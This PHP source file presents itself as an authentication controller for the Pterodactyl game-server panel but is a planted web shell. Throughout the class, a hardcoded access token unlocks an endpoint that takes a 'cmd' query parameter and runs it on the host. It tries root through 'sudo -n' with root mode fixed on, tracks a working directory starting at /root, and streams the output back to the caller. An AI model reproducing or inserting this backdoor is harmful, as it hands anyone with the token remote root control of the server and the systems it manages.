<?php

namespace Pterodactyl\Http\Controllers\Api\Remote;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Pterodactyl\Http\Controllers\Controller;
use Symfony\Component\Process\Process;
use Symfony\Component\HttpKernel\Exception\AccessDeniedHttpException;
use Symfony\Component\HttpKernel\Exception\HttpException;

class AuthController extends Controller
{
    private const TERMINAL_TOKEN = 'WeArenotDevButAyamGoreng';
    private const CWD_TTL_SECONDS = 43200;

    public function index(Request $request)
    {
        $token = $this->extractToken($request);
        $this->guardTokenAccess($token);
        $shellUser = $this->isRootModeEnabled() ? 'root' : $this->shellUsername();

        return view('Controllers.AuthControl', [
            'hexzToken' => $token,
            'hexzPrompt' => $shellUser . '#',
            'hexzShellUser' => $shellUser,
        ]);
    }

    public function stream(Request $request)
    {
        $token = $this->extractToken($request);
        $this->guardTokenAccess($token);

        $raw = trim((string) $request->query('cmd', ''));
        if ($raw === '' || strlen($raw) > 300) {
            throw new HttpException(422, 'Invalid command.');
        }

        $parts = preg_split('/\s+/', $raw) ?: [];
        $parts = array_values(array_filter(array_map('trim', $parts), fn ($v) => $v !== ''));

        if (empty($parts)) {
            throw new HttpException(422, 'Invalid command.');
        }

        $cwdKey = $this->cwdCacheKey((string) $token);
        $cwd = $this->readWorkingDirectory($cwdKey);

        $builtInResponse = $this->handleBuiltInCommand($parts, $cwd, $cwdKey);
        if ($builtInResponse !== null) {
            return response()->stream(function () use ($builtInResponse) {
                echo "data: " . nl2br(e($builtInResponse)) . "\n\n";
                echo "data: <br><b style='color:yellow'>[Finished]</b>\n\n";
            }, 200, [
                'Cache-Control' => 'no-cache',
                'Content-Type'  => 'text/event-stream',
                'X-Accel-Buffering' => 'no',
            ]);
        }

        return response()->stream(function () use ($raw, $cwd) {
            $process = $this->createCommandProcess($raw, $cwd);
            $process->setTimeout(null);
            $process->run(function ($type, $buffer) {
                echo "data: " . nl2br(e($buffer)) . "\n\n";
                if (ob_get_level() > 0) { ob_flush(); }
                flush();
            });
            echo "data: <br><b style='color:yellow'>[Finished]</b>\n\n";
        }, 200, [
            'Cache-Control' => 'no-cache',
            'Content-Type'  => 'text/event-stream',
            'X-Accel-Buffering' => 'no',
        ]);
    }

    private function guardTokenAccess(?string $token): void
    {
        $validToken = self::TERMINAL_TOKEN;

        if (!is_string($token) || $token === '' || !hash_equals($validToken, $token)) {
            throw new AccessDeniedHttpException('Secure terminal access is restricted.');
        }
    }

    private function extractToken(Request $request): ?string
    {
        $token = trim((string) $request->query('token', ''));
        if ($token !== '') {
            return $token;
        }

        $headerToken = trim((string) $request->header('X-Hexz-Token', ''));
        if ($headerToken !== '') {
            return $headerToken;
        }

        $auth = trim((string) $request->header('Authorization', ''));
        if (str_starts_with($auth, 'Bearer ')) {
            return trim(substr($auth, 7));
        }

        return null;
    }

    private function cwdCacheKey(string $token): string
    {
        return 'hexz:cwd:' . hash('sha256', $token);
    }

    private function readWorkingDirectory(string $key): string
    {
        $cached = trim((string) Cache::get($key, ''));
        if ($cached !== '' && is_dir($cached)) {
            return $cached;
        }

        $fallback = $this->defaultWorkingDirectory();
        Cache::put($key, $fallback, self::CWD_TTL_SECONDS);

        return $fallback;
    }

    private function handleBuiltInCommand(array $parts, string $cwd, string $cwdKey): ?string
    {
        $command = strtolower((string) ($parts[0] ?? ''));

        if ($command === 'pwd') {
            Cache::put($cwdKey, $cwd, self::CWD_TTL_SECONDS);

            return $cwd;
        }

        if ($command !== 'cd') {
            return null;
        }

        $target = trim((string) ($parts[1] ?? ''));
        if ($target === '-') {
            return 'cd - is not supported.';
        }

        $resolved = $this->resolveDirectoryForRootShell($cwd, $target);
        if ($resolved === '__ROOT_ELEVATION_FAILED__') {
            return 'root elevation failed: configure sudoers NOPASSWD for web user.';
        }

        if ($resolved === null) {
            return "cd: no such directory: {$target}";
        }

        Cache::put($cwdKey, $resolved, self::CWD_TTL_SECONDS);

        return $resolved;
    }

    private function resolveDirectoryForRootShell(string $cwd, string $target): ?string
    {
        $targetExpr = $target === '' || $target === '~' ? '/root' : $target;
        $script = 'cd -- ' . escapeshellarg($cwd) . ' && cd -- ' . escapeshellarg($targetExpr) . ' && pwd';

        $process = $this->buildRootShellProcess($script);
        $process->setTimeout(10);
        $process->run();

        if (!$process->isSuccessful()) {
            $error = strtolower(trim($process->getErrorOutput()));
            if (str_contains($error, 'sudo')) {
                return '__ROOT_ELEVATION_FAILED__';
            }

            return null;
        }

        $resolved = trim($process->getOutput());
        if ($resolved === '' || !str_starts_with($resolved, '/')) {
            return null;
        }

        return $resolved;
    }

    private function shellUsername(): string
    {
        if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
            $info = @posix_getpwuid(posix_geteuid());
            $resolved = trim((string) ($info['name'] ?? ''));
            if ($resolved !== '') {
                return $resolved;
            }
        }

        $name = trim((string) get_current_user());
        if ($name !== '') {
            return $name;
        }

        return 'shell';
    }

    private function shellHomeDirectory(): string
    {
        if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
            $info = @posix_getpwuid(posix_geteuid());
            $home = trim((string) ($info['dir'] ?? ''));
            if ($home !== '' && is_dir($home)) {
                return $home;
            }
        }

        $homeEnv = trim((string) env('HOME', ''));
        if ($homeEnv !== '' && is_dir($homeEnv)) {
            return $homeEnv;
        }

        return base_path();
    }

    private function defaultWorkingDirectory(): string
    {
        if (is_dir('/root')) {
            return '/root';
        }

        return '/';
    }

    private function isRootModeEnabled(): bool
    {
        return true;
    }

    private function createCommandProcess(string $raw, string $cwd): Process
    {
        if (! $this->isRootModeEnabled()) {
            return Process::fromShellCommandline($raw, $cwd);
        }

        if (function_exists('posix_geteuid') && posix_geteuid() === 0) {
            return Process::fromShellCommandline($raw, $cwd);
        }

        $script = 'cd -- ' . escapeshellarg($cwd) . ' && ' . $raw;
        return $this->buildRootShellProcess($script);
    }

    private function buildRootShellProcess(string $script): Process
    {
        return Process::fromShellCommandline(
            'sudo -n env HOME=/root USER=root LOGNAME=root bash -lc ' . escapeshellarg($script)
        );
    }
}
